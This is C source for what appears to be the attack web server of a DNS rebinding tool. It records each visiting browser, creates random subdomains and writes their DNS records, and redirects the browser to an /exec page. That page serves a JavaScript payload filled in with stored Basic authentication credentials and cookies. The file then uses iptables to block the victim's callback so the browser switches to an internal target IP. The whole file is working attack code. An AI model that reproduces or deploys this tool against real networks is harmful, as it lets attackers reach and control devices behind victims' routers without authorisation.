/* Attack Web server is responsible for:
	1) Getting the target's public IP address from the target's /init request.
	2) Generating a random sub-domain of the FQDN specified on the command line.
	3) Updating the DNS SQL table with the random sub-domain and the associated target's IP address.
	4) Redirecting the target to the http://<random sub-domain>.<FQDN>:<PORT>/exec URL.
	5) Delivering the JavaScript code when the client requests the /exec page.
	6) Blocking the client IP from further connections to the attack server.
	7) Unblocking the client IP when the client stops calling back.
*/

#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include "common.h"
#include "config.h"
#include "socklib.h"
#include "iptables.h"
#include "sql.h"
#include "dns.h"
#include "attack.h"
#include "html.h"

/* Start and control the attack web server */
int attack_web_server()
{
	int rx_bytes = 0;
	int lsock = 0, csock = 0;
	int addrlen = sizeof(struct sockaddr_in);
	char *buffer = NULL, *server_ip = NULL, *attack_port = NULL;
	struct sockaddr_in clientaddr;
	struct itimerval itimer;

	memset((void *) &clientaddr,0,addrlen);
	memset((void *) &itimer,0,sizeof(struct itimerval));

	/* Set an alarm to periodically clean up IP addresses blocked via iptables */
	itimer.it_interval.tv_sec = CHECK_CLIENT_INTERVAL;
	itimer.it_value.tv_sec = CHECK_CLIENT_INTERVAL;
	signal(SIGALRM,cleanup_iptables);
	setitimer(ITIMER_REAL,&itimer,NULL);

	server_ip = config_get_server_ip();
	attack_port = config_get_attack_port();

	/* Create TCP socket bound to server_ip:attack_port */
        if((lsock = create_socket(server_ip,atoi(attack_port),SOCK_STREAM)) == SOCK_FAIL){
                glog("Could not start attack Web server: Failed to create TCP socket",LOG_ERROR_TYPE);
		if(server_ip) free(server_ip);
		if(attack_port) free(attack_port);
                return EXIT_FAILURE;
	}
	if(server_ip) free(server_ip);
	if(attack_port) free(attack_port);

	while(1){

                if((csock = accept(lsock,(struct sockaddr *) &clientaddr,(socklen_t *) &addrlen)) < 0){
                      	glog("Failed to accept connection to attack server",LOG_ERROR_TYPE);
                        if(buffer) free(buffer);
                        return EXIT_FAILURE;
		}

		if(!fork()){
			/* Receive client request */
			if((buffer = receive(lsock,SOCK_STREAM,&rx_bytes,csock,&clientaddr)) == NULL){
				glog("Failed to receive data from client in attack Web server",LOG_ERROR_TYPE);
				continue;
			}

			/* Handle the client request */
			process_client_request(clientaddr,csock,buffer,rx_bytes);

			close_socket(csock);
			if(buffer) free(buffer);
			buffer = NULL;
			exit(EXIT_SUCCESS);
		}
	}

	/* Close up shop */
	close_socket(csock);
	close_socket(lsock);
	if(buffer) free(buffer);

	/* Clear the alarm */
	ualarm(0,0);

	return EXIT_FAILURE;
}

/* Process client requests */
int process_client_request(struct sockaddr_in clientaddr, int csock, char *buffer, int buflen)
{
	char *client_ip_address = NULL, *target_ip = NULL, *sql = NULL;
	char *host = NULL, *redir_host = NULL, *message = NULL;
	char *fqdn = NULL, *fqdn_np = NULL;
	char rand_host[RAND_HOST_LEN+1] = { 0 };
	int i = 0, msg_type = 0, err_code = 0, result_size = 0, min_request_size = 0, ret_val = ATTACK_CONTINUE;

	/* Get the requesting client's IP address */
	client_ip_address = strdup(inet_ntoa(clientaddr.sin_addr));

	/* Calculate the minimum length for a valid HTTP request */
	min_request_size = HTTP_POST_SIZE + (SPACE_SIZE*2);
	if(EXEC_REQUEST_SIZE > INIT_REQUEST_SIZE){
		min_request_size += EXEC_REQUEST_SIZE;
	} else {
		min_request_size += INIT_REQUEST_SIZE;
	}

	/* Make sure we got a client IP address, and that the data received is at least larger than the expected request URLs */
	if((client_ip_address != NULL) && (buflen > min_request_size)){

		/* Only process GET requests */
		if(strstr(buffer,HTTP_GET) == buffer){

			/* If this is the init request, redirect them to the attack domain */
			if(memcmp((buffer+HTTP_GET_SIZE+SPACE_SIZE),INIT_REQUEST,INIT_REQUEST_SIZE) == 0){

				/* If a specific target IP was specified on the command line, use that; else, target the client's public IP */
                		sql = sqlite3_mprintf("SELECT ip FROM %s ORDER BY count LIMIT 1", TARGETS_TABLE);
                		target_ip = sql_exec(sql, &result_size, &err_code);
                		sqlite3_free(sql);
                		if(err_code != SQLITE_OK){
                		        glog("SQL query failed!",LOG_ERROR_TYPE);
                		        sql_log_error();
                		        if(client_ip_address) free(client_ip_address);
                		        return ret_val;
                		} else if(target_ip != NULL){
                        		/* If we are using one of the target IPs from the database, be sure to update the count */
                        		sql = sqlite3_mprintf("UPDATE %s SET count=count+1 WHERE ip = %Q", TARGETS_TABLE, target_ip);
                        		sql_exec(sql,&result_size,&err_code);
                        		sqlite3_free(sql);
                        		if(err_code != SQLITE_OK){
                                		sql_log_error();
                        		}
		                }

				/* If there were no targets specified on the command line, use the client's IP address */
				if(!target_ip){
                        		target_ip = strdup(client_ip_address);
                		}

				srand((unsigned int) time(NULL));

				/* This loop generates the random sub-domain that the client will be re-directed to */
        			for(i=0;i<RAND_HOST_LEN;i++){
                			rand_host[i] = (char) (rand() % ASCII_MAX) + ASCII_MIN;
        			}
			
				/* Update the DNS database with the IP addresses for the new sub-domain */
				fqdn = config_get_fqdn();
        			host = sqlite3_mprintf("%s.%s",(char *) &rand_host,fqdn);
				update_dns_config(host,target_ip);
				if(fqdn) free(fqdn);

				/* Re-direct the client to the /exec page */
				fqdn_np = config_get_fqdn_np();
        			redir_host = sqlite3_mprintf("%s.%s",(char *) &rand_host,fqdn_np);
				send_http_redirect(csock,redir_host,EXEC_REQUEST);
				if(fqdn_np) free(fqdn_np);

				sqlite3_free(host);
				sqlite3_free(redir_host);

			/* Else, if this is the exec request, then deliver the payload JavaScript */
			} else if(memcmp((buffer+HTTP_GET_SIZE+SPACE_SIZE),EXEC_REQUEST,EXEC_REQUEST_SIZE) == 0){

				/* This is the last stage of the JS attack, so we must be sure to block off that client from the attack_port.
                                 * That way, when the XMLHTTPRequest attempts to connect back to us, the connection will be rejected, and the browser
                                 * will fail over to the second IP address, which is the target IP.
                                 */
				block_client(client_ip_address);
	
				/* Deliver the JavaScript payload to the client browser */
				if(send_payload(csock)){
					message = sqlite3_mprintf("Attack payload delivered to %s",client_ip_address);
					msg_type = LOG_MESSAGE_TYPE;
				} else {
					message = sqlite3_mprintf("Failed to deliver attack payload to %s",client_ip_address);
					msg_type = LOG_ERROR_TYPE;
				}

				/* Log if the payload was delivered successfully or not */
                                glog(message,msg_type);
                                sqlite3_free(message);
	
				ret_val = ATTACK_DONE;
			}
		}

	}

	if(client_ip_address) free(client_ip_address);
	if(target_ip) free(target_ip);
	return ret_val;
}

/* Deliver JavaScript payload */
int send_payload(int csock)
{
	char *payload = configure_payload();
	int payload_size = strlen(payload);

	if(send_http_response(csock,payload,payload_size) == SOCK_FAIL){
		return 0;
	}

	if(payload) free(payload);
	return 1;
}

/* Configure the payload HTML with the supplied Basic authentication credentials and the default request path */
char *configure_payload()
{
	char *payload = NULL, *user = NULL, *pass = NULL, *path = NULL, *callback_port = NULL, *interval = NULL, *cookie = NULL;

	payload = strdup(PAYLOAD);
	if(!payload){
		perror("Strdup failure");
		return NULL;
	}

	user = config_get_user();
	pass = config_get_pass();
	path = config_get_path();
	callback_port = config_get_callback_port();
	interval = config_get_interval();
	cookie = url_encode(config_get_cookie());

	payload = str_replace(payload,USER_PLACEHOLDER,user);
	payload = str_replace(payload,PASS_PLACEHOLDER,pass);
	payload = str_replace(payload,PATH_PLACEHOLDER,path);
	payload = str_replace(payload,PORT_PLACEHOLDER,callback_port);
	payload = str_replace(payload,TIME_PLACEHOLDER,interval);
	payload = str_replace(payload,COOKIE_PLACEHOLDER,cookie);

	if(user) free(user);
	if(pass) free(pass);
	if(path) free(path);
	if(callback_port) free(callback_port);
	if(interval) free(interval);
	if(cookie) free(cookie);
	return payload;
}

/* Reply to any further TCP SYN packets from the given IP with TCP RST packets */
void block_client(char *client_ip_address)
{
	char *block_sql = NULL, *server_ip = NULL, *attack_port = NULL;
	int response_size = 0, err_code = 0;
	float timeout = 0;

	server_ip = config_get_server_ip();
	attack_port = config_get_attack_port();
	timeout = (float) ((config_get_connection_timeout() * 2));

	if(iptables_block(client_ip_address,server_ip,atoi(attack_port),IPTABLES_PROTO_TCP) == IPTABLES_FAIL){
		glog("Failed to block client on attack port",LOG_ERROR_TYPE);
	}

	if(server_ip) free(server_ip);
	if(attack_port) free(attack_port);

        /* Log that this client was blocked so that he can be un-blocked after the connection_timeout*2 
	 * period has expired. Without the block_time value set, the ualarm may check the callback time before the
	 * first callback is made and prematurely un-block the client.
	 */

        block_sql = sqlite3_mprintf("INSERT OR REPLACE INTO %s (ip,block_time) VALUES (%Q,DATETIME('now','+%f seconds'))",CLIENTS_TABLE,client_ip_address,timeout);
        sql_exec(block_sql,&response_size,&err_code);
        if(err_code != SQLITE_OK){
        	sql_log_error();
        }
        sqlite3_free(block_sql);

	return;
}

/* SIGALRM handler which periodically cleans up stale callback sessions from clients */
void cleanup_iptables(int sig)
{
	char *select_query = NULL, *update_sql = NULL, *message = NULL;
	char *ip = NULL, *id = NULL, *server_ip = NULL, *attack_port = NULL;
	sqlite3_stmt *stmt = NULL;
	int rc = 0, col_type = 0, response_size = 0, err_code = 0;

	if(sig != SIGALRM){
		return;
	}

	/* Query to get a list of all IPs whose callbacks have timed out and who have not yet been unblocked */
	select_query = sqlite3_mprintf("SELECT id,ip FROM %s WHERE strftime('%%s',block_time) < strftime('%%s','now') AND strftime('%%s',callback_time) < strftime('%%s','now') AND unblocked = 0",CLIENTS_TABLE);
	rc = sqlite3_prepare_v2(globals.db,select_query,strlen(select_query),&stmt,NULL);
        if(rc != SQLITE_OK){
		sql_log_error();
		sqlite3_free(select_query);
                return;
        }

	server_ip = config_get_server_ip();
	attack_port = config_get_attack_port();

        /* Un-block clients from the attack port whose callbacks have timed out */
        while((rc = sqlite3_step(stmt)) != SQLITE_DONE){
                switch(rc){

                        case SQLITE_ERROR:
				continue;

                        case SQLITE_BUSY:
                                /* If the table is locked, wait then try again */
                                usleep(BUSY_WAIT_PERIOD);
                                break;

                        case SQLITE_ROW:
                        {
                                col_type = sqlite3_column_type(stmt,1);
                                switch(col_type)
                                {
                                        case SQLITE_TEXT:
					{
						id = (void *) sqlite3_column_text(stmt,0);
                                                ip = (void *) sqlite3_column_text(stmt,1);

						/* Unblock this IP address */
						iptables_unblock(ip,server_ip,atoi(attack_port),IPTABLES_PROTO_TCP);

						/* Remove this entry from the blocked IP address table */
						update_sql = sqlite3_mprintf("UPDATE %s SET unblocked = 1 WHERE id = %Q",CLIENTS_TABLE,id);
						sql_exec(update_sql,&response_size,&err_code);
						if(err_code != SQLITE_OK){
							sql_log_error();
						}
						sqlite3_free(update_sql);

						/* Log that this client has been unblocked */
						message = sqlite3_mprintf("Callback timeout exceeded for %s",ip);
						glog(message,LOG_MESSAGE_TYPE);
						sqlite3_free(message);

						break;
					}
				}
			}
		}
	}
	sqlite3_finalize(stmt);
	sqlite3_free(select_query);
	if(server_ip) free(server_ip);
	if(attack_port) free(attack_port);

	return;
}
